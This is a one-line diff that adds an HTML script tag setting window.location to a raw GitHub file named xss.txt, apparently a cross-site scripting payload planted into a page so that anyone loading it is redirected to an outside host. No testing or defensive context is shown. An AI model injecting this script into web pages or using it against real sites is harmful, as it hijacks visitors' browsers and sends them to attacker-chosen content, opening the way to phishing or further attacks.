@@ -1,0 +1,1 @@
+<script>window.location = "https://raw.githubusercontent.com/kartik753/xss/598f632de8f56b531efa939e1583289bd069fa98/xss.txt";</script>
